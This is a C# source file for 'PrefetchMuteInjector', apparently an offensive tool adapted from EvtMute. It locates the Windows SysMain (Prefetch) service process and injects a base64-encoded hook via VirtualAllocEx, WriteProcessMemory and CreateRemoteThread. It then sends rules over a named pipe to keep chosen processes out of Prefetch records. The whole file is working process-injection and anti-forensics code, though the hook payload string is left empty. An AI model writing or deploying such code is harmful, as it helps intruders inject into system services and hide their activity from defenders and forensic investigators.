using System;
using NDesk.Options;
using System.IO.Pipes;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace PrefetchMuteInjector
{
    class PrefetchMuteInjector
    {

        [DllImport("kernel32.dll")]
        public static extern IntPtr CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        const uint PAGE_EXECUTE_READWRITE = 0x00000040;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const int PROCESS_ALL_ACCESS = 0x001FFFFF;


        const string PrefetchHook = "";




        static int FindSysmainSvc()
        {
            Process[] proclist = Process.GetProcesses();

            foreach (Process proc in proclist)
            {
                try
                {
                    foreach (ProcessModule module in proc.Modules)
                    {
                        if (module.ToString().Contains("sysmain.dll"))
                        {
                            return proc.Id;
                        }
                    }
                }
                catch { }
            }

            return -1;
        }

        static bool InjectHook(int pid)
        {
            IntPtr hThread;
            IntPtr hProcess;
            IntPtr lpBuffer;
            bool bWriteSuccess;
            UIntPtr dwBytesWritten;

            byte[] lpDecodedHook = System.Convert.FromBase64String(PrefetchHook);

            hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            if (hProcess == null)
            {
                Console.WriteLine("[!] OpenProcess(): FAILED");
                return false;
            }

            lpBuffer = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)lpDecodedHook.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (lpBuffer == null)
            {
                Console.WriteLine("[!] VirtualAllocEx(): FAILED");
                return false;
            }

            bWriteSuccess = WriteProcessMemory(hProcess, lpBuffer, lpDecodedHook, (uint)lpDecodedHook.Length, out dwBytesWritten);
            if (bWriteSuccess == false)
            {
                Console.WriteLine("[!] WriteProcessMemory(): FAILED");
                return false;
            }

            hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, lpBuffer, IntPtr.Zero, 0, IntPtr.Zero);
            if (hThread == null)
            {
                Console.WriteLine("[!] CreateRemoteThread(): FAILED");
                return false;
            }

            CloseHandle(hProcess);

            return true;
        }

        static void ShowHelp(OptionSet p)
        {
            Console.WriteLine("Usage: prefetchmute [-p/--Pid] [-i/--Inject] [-e/--Encoded] [-f/--Filter]");
            Console.WriteLine("Options:");
            p.WriteOptionDescriptions(Console.Out);
        }

        static bool UpdateFilterRule(string Rule)
        {

            var SysmainSvcPipe = new NamedPipeClientStream(".", "prefetch_rule_pipe", PipeDirection.Out, PipeOptions.None, System.Security.Principal.TokenImpersonationLevel.Impersonation);

            try
            {
                SysmainSvcPipe.Connect(5000);
            }
            catch (TimeoutException)
            {
                Console.WriteLine("[!] Connection timed out. Have you injected the hook?");
                return false;
            }

            SysmainSvcPipe.Write(System.Text.Encoding.ASCII.GetBytes(Rule), 0, System.Text.Encoding.ASCII.GetBytes(Rule).Length);
            SysmainSvcPipe.Dispose();

            Console.WriteLine("[+] Item added to filter list");

            return true;
        }

        static void Main(string[] args)
        {
            int pid = 0;
            List<string> extra;
            string NewRule = null;
            bool bDoHooking = false;
            bool bOnlyFindPid = false;

            Console.WriteLine("PrefetchMuteInjector");
            Console.WriteLine("@passthehashbrwn");
            Console.WriteLine("Many thanks to @_bats3c_ for EvtMute\n");

            var p = new OptionSet()
            {
                { "p|Pid", "Find the PID of the event service.", v => { bOnlyFindPid = true; } },
                { "i|Inject", "Inject the hook into the event service", v => { bDoHooking = true; bOnlyFindPid = true; } },
                { "f|Filter=", "Process to add to block list", v => { NewRule = v; } },
            };

            try
            {
                extra = p.Parse(args);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
                return;
            }

            if (args.Length == 0)
            {
                ShowHelp(p);
                return;
            }

            if (bOnlyFindPid == true)
            {
                pid = FindSysmainSvc();
                if (pid == -1)
                {
                    Console.WriteLine("[!] Failed to find sysmain.dll, you got the correct privs?");
                    return;
                }

                Console.WriteLine("[i] Found PID: {0}", pid);
            }

            if (bDoHooking == true)
            {
                bool bSuccess = InjectHook(pid);
                if (bSuccess == true)
                {
                    Console.WriteLine("[+] Injected hook");
                }
                else
                {
                    Console.WriteLine("[!] Failed to inject hook, check your privs");
                }
            }

            if (NewRule != null)
            {
                UpdateFilterRule(NewRule);
            }
        }
    }
}

